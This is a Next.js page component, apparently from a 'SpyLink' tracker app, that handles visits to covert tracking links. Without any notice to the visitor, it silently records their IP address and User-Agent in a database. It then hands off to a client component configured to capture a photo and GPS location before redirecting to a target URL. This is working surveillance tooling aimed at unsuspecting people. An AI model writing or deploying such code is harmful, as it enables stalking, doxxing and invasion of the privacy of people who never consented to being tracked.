import { db } from '@/lib/db';
import { spylinks, logs } from '@/db/schema';
import { eq } from 'drizzle-orm';
import { headers } from 'next/headers';
import ClientCapture from './client-capture';

interface PageProps {
  params: Promise<{ id: string }>;
}

export default async function SpyLinkPage({ params }: PageProps) {
  const resolvedParams = await params;
  const linkId = resolvedParams.id;

  const [link] = await db.select().from(spylinks).where(eq(spylinks.id, linkId));

  if (!link) {
    return <div className="min-h-screen bg-black text-white flex items-center justify-center font-mono">Link inválido ou expirado.</div>;
  }

  // Captura IP e User-Agent no servidor
  const headersList = await headers();
  const rawIp = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || 'IP Desconhecido';
  const clientIp = rawIp.split(',')[0].trim();
  const userAgent = headersList.get('user-agent') || 'Desconhecido';

  // Salva o log inicial de IP no banco
  const [newLog] = await db.insert(logs).values({
    spylinkId: link.id,
    ip: clientIp,
    userAgent: userAgent,
  }).$returningId();

  return (
    <ClientCapture 
      logId={newLog.id} 
      targetUrl={link.targetUrl} 
      capturePhoto={link.capturePhoto ?? false} 
      captureGps={link.captureGps ?? false} 
    />
  );
}